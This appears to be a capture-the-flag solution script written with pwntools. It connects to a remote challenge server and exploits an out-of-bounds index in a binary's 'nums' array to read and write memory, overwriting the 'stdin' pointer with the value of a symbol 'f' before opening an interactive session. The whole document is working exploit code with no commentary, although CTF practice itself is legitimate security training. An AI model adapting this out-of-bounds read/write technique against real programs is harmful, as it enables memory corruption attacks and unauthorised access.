from pwn import *

context.log_level = "error"
elf = context.binary = ELF("index-2")

p = remote('play.scriptsorcerers.xyz', 10091)

def get_idx(rel_ptr):
    return (rel_ptr - elf.sym["nums"]) // 8

def get_data(rel_ptr):
    p.sendline(b"2")
    p.sendlineafter(b"Index: ", str(get_idx(rel_ptr)).encode())
    p.recvuntil(b"Data: ")
    return p.recvuntil(b"1. Store")[:-len(b"1. Store")][:8].ljust(8, b"\x00")

def write(rel_ptr, data):
    p.sendline(b"1")
    p.sendlineafter(b"Index: ", str(get_idx(rel_ptr)).encode())
    p.sendafter(b"Data: ", data)

p.sendline(b"1337")
write(elf.sym["stdin"], get_data(elf.sym["f"]))

p.interactive()